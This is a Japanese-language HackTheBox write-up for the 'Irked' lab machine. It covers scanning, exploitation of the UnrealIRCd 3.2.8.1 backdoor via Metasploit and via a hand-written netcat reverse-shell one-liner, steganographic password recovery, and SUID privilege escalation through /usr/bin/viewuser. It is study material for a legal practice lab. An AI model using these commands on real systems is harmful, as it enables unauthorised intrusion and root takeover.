# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Irked
![コメント 2020-08-22 104107.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/af900ece-da87-e69f-d1c8-f110c56e7328.png)

HackTheBox公式より
Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.

Irked は、基本的な列挙のスキルを必要とする、非常にシンプルでわかりやすいボックスです。マシン上のすべてのポートをスキャンして、システムを列挙している間に見つかった場所から出てきたバイナリを調査する必要があることを示しています。

# スキャン
Irked(10.10.10.117)に対して、スキャンを行います。
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -p- -oN nmap/full 10.10.10.117 
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -p-...全ポートスキャン
- -oN...通常出力

```
# Nmap 7.80 scan initiated Thu Aug 20 10:30:34 2020 as: nmap -sC -sV -oN nmap/full -p- 10.10.10.117                                                                                                                                        
Nmap scan report for 10.10.10.117                                                                                                                                                                                                          
Host is up (0.26s latency).                                                                                                                                                                                                                
Not shown: 65422 closed ports, 106 filtered ports                                                                                                                                                                                          
PORT      STATE SERVICE VERSION                                                                                                                                                                                                            
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)                                                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                                             
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)                                                                                                                                                                             
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)                                                                                                                                                                             
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)                                                                                                                                                                            
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)                                                                                                                                                                          
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                                                                                     
|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                                                                               
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                       
111/tcp   open  rpcbind 2-4 (RPC #100000)                                                                                                                                                                                                  
| rpcinfo:                                                                                                                                                                                                                                 
|   program version    port/proto  service                                                                                                                                                                                                 
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                                                                 
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                                                                                 
|   100000  3,4          111/tcp6  rpcbind                                                                                                                                                                                                 
|   100000  3,4          111/udp6  rpcbind                                                                                                                                                                                                 
|   100024  1          35283/tcp6  status                                                                                                                                                                                                  
|   100024  1          43756/udp   status                                                                                                                                                                                                  
|   100024  1          57539/tcp   status
|_  100024  1          58901/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
57539/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 11:12:01 2020 -- 1 IP address (1 host up) scanned in 2486.92 seconds
```

この結果から80番ポートが空いていることが分かります。
ブラウザからアクセスしてみると以下のような画像が表示されます。
![コメント 2020-08-20 233320.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/dcf927d6-388b-c7ab-89e9-217f0bd1ff37.png)

# gobuster
手がかりを探すために、gobusterを使いますがめぼしいものは見つかりませんでした。

```
gobuster dir -u http://10.10.10.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o initial
```

- dir...dirモード
- -u...URL指定
- -w...ワードリスト指定
- -o...ファイル出力

```
/manual (Status: 301)
/server-status (Status: 403)
```

# UnrealIRCd
6697,8067,65534番ポートではircのデーモンであるUnrealIRCdが稼働しています。
UnrealIRCdに繋ぐために、今回はhexchatを使用します。

```
sudo apt install hexchat
```

hexchatを起動し、下記の画像のようにネットワーク情報を設定します。
![スクリーンショット 2020-08-25 20.15.29.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f14b93d4-0f98-b6e4-f8f6-03a9b876301d.png)

設定が完了後、接続をするとUnrealIRCdのバージョンが3.2.8.1であることが分かります。
![コメント 2020-08-21 141613.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/ea5aaa9a-ba13-86a7-fe28-d02d99ccf3c9.png)

searchsploitにてUnrealIRCdについて検索すると、metasploitで利用できるexploitを見つけることができます。
![コメント 2020-08-21 141700.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/18e0dbb5-4d8b-337a-3fe5-6e85f35a9188.png)

また、Googleで検索してみたところバックドアの発火のさせ方が記載されていました。具体的には「AB」で始まるサーバに送信されたコマンドが直接system()に渡されるというものです。
![スクリーンショット 2020-08-25 20.21.20.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2bd7491d-fe67-e226-ce7a-74b186bae423.png)

今回はmetasploitと手動の両方で、侵入を行いたいと思います。

# 侵入
今回はmetasploitと手動の両方で、侵入を行いたいと思います。
## metasploit
まずはmetasploitを使用して、侵入を行います。
searchコマンドを用いて使用するモジュールを検索します。
![コメント 2020-08-21 142028.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/59672ec7-5eaa-c784-4eaa-ef24ddee3eae.png)
次にexploitの設定を行います。

```
use exploit/unix/irc/unireal_ircd_3281_backdoor
set RHOTS 10.10.10.117
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST <attacker ip>
set LPORT 1337
exploit
```

![スクリーンショット 2020-08-25 20.54.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/341456f6-e0db-490a-b55c-eb3f4d179bc3.png)

このままでは不便なシェルなので、新たにシェルを繋ぎなおします。
調べてみると、pythonが入っているようなのでpythonを使ってシェルを取得します。
![コメント 2020-08-21 143939.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/26595e3d-e7d1-83d8-38dd-74938d269754.png)
![コメント 2020-08-21 143957.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9254eba5-a3e1-7e58-e436-dffc2076d724.png)

## 手動でのエクスプロイト
「AB」で始まるサーバに送信されたコマンドが直接system()に渡されるというものなので、今回それを利用します。
下記の画像のようにコマンドをnetcatを通じて送信することでシェルを取得することができました。

```
echo "AB; bash -c 'bash -i >& /dev/tcp/<attacker ip><attacker port> 0>&1'" | nc 10.10.10.117 65534
```

![コメント 2020-08-21 191135.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/162531fb-d5d3-dfb5-eede-70e07c35c151.png)

## Lateral movement(横展開)
ircdのユーザは手に入れることができましたが、user.txtを開くことはできませんでした。
そこでuser.txtの所有者であるdjmardovというユーザでアクセスできるようにしたいと思います。
ls -laコマンドの結果、user.txtと並んで.backupというファイルが配置されていました。
内容を見てみると何かのパスワードのようです。
またstegというsteganographyを彷彿させるような記述があります。
![コメント 2020-08-21 144625.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b0bb4518-70af-8cce-75f9-40924eaeb420.png)

今のところ、画像は取得できる画像は下記のものなので、これを取得してステガノグラフィーを検証します。
![コメント 2020-08-20 233320.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/304f9442-db62-8578-eaa0-f6b2daa98ca6.png)

```
wget http://10.10.10.117/irked.jpg
steghide extract -sf irked.jpg
```

先ほど見つけたパスフレードを入力するとpass.txtを取得することができます。
![コメント 2020-08-21 152458.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/40781bbd-96c2-1e65-5827-6f3121c46535.png)
pass.txtに書かれていたパスワードをsshを介してdjmardovで使用すると、djmardovでログインすることができます。
![コメント 2020-08-21 152610.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/eabc13bb-e13a-5a79-7ba6-2ab5c4396560.png)

# Privileges Escalation(権限昇格)
次にroot.txtを取得するために権限昇格を行います。
権限昇格に使えるものを探すためにlinpeasを使用します。
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
pythonでサーバを立ててlinpeasを送る用意をします。

```
python3 -m http.server 9001
```

![コメント 2020-08-21 153227.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/72526ef8-4bdc-ee89-045b-4dbc15b3d0bb.png)
次に、wgetを使用してirkedマシン上で実行します。

```
wget http://10.10.10.14.7:9001/linpeas.sh
chmod 755 linpeas.sh
./linpeas.sh
```

![コメント 2020-08-21 153251.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f9e8e929-97ea-4ac0-93c6-a95a2f01ec76.png)
ここではSUIDをチェックします。
Linuxでは、SUIDアクセス許可を持つファイルはより高い特権で実行することができます。root以外のユーザーとしてアクセスし、suidビットが有効なバイナリが見つかったとするとそれらのファイル・プログラム・コマンドはroot権限で実行することができます。
![コメント 2020-08-21 154000.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d049e44c-7870-0ea9-f21c-29c997b91c4e.png)
中でも、/usr/bin/viewuserというものが気になるので実行してみます。
![コメント 2020-08-21 160106.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/adc6699c-6d02-ba3d-28df-aa2385510020.png)
実行すると/tmp/listusersが見つからないと表示されます。
![コメント 2020-08-21 160216.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/898a6179-361e-abc5-9256-6f92d788d967.png)
viewuserはroot権限で動作しているので、/tmp/listusersにコマンドを書き込んで実行することで、rootシェルを取得できないか試してみます。
![コメント 2020-08-21 160300.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2e58bc1f-52b5-4700-58e1-5607cce42888.png)
![コメント 2020-08-21 160347.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f8f67d64-0935-f100-e903-1f50fab49047.png)

root権限を取得することができました。
お疲れ様でした。
